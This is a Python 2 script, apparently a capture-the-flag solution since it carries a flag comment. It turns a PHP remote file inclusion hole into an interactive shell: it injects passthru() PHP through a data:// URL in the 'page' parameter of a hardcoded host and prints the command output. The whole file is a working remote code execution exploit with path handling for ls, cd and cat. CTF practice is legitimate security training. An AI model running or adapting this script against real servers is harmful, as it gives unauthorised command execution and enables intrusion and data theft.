from requests import *
from termcolor import colored

#AD{RF1_Is_v3ry_d4ng3r}

url = 'http://140.115.59.13:8764/index.php'
prompt = '/var/www/html'

def pac( cmd ):
    global prompt
    tmp = cmd.split()
    if tmp[0] == 'ls':
        if len(tmp) < 2:
            return cmd + ' ' + prompt
        elif cmd.find('-') > -1:
            para = tmp[0]
            for c in tmp[1:]:
                para += ' ' + c
                if c[:1] != '-':
                    return para
            return cmd + ' ' + prompt
        else :
            if tmp[1][0] != '/':
                return 'ls ' + prompt + '/' + tmp[1]
            else :
                return cmd

    elif tmp[0] == 'cd':
        _pos = prompt.split('/')
        del _pos[0]
        if tmp[1][0] == '/':
            prompt = tmp[1]
            return cmd
        for ac in tmp[1].split('/'):
            if ac == '' or ac == '.':
                continue
            elif ac == '..':
                if len(_pos) > 0:
                    _pos.pop()
            else :
                _pos.append(ac)
        if len(_pos) > 0:
            if _pos[0] == '':
                del _pos[0]
        prompt = '/' + '/'.join(_pos)
        return 'cd' + ' ' + prompt
    elif tmp[0] == 'file' or tmp[0] == 'cat':
        if tmp[1][0] != '/' or tmp[1][:2] == './':
            return  tmp[0] + ' ' + prompt + '/' + tmp[1]
        else :
            return cmd

    else :
        return cmd


while True:
    cmd = raw_input( colored( prompt , 'green' ) + colored( '$' , 'red' ) )
    if cmd == '':
        continue
    try :
        data = '<?php echo \'ABCD\';echo passthru(\'{}\');echo \'EFGH\';?>'.format( pac(cmd) )
    except:
        print colored('Oops! There may have some local error.' , 'red')
        continue
    if cmd.split()[0] == 'pwd' or cmd.split()[0] == 'cd':
        if cmd.split()[0] == 'pwd':
            print prompt
        continue
    res = get( url + '?page=data://text/plain,' + data )
    if not res.content[ res.content.find('ABCD') + 4 : res.content.find('EFGH') ]:
        continue
    print res.content[ res.content.find('ABCD') + 4 : res.content.find('EFGH') ].strip()
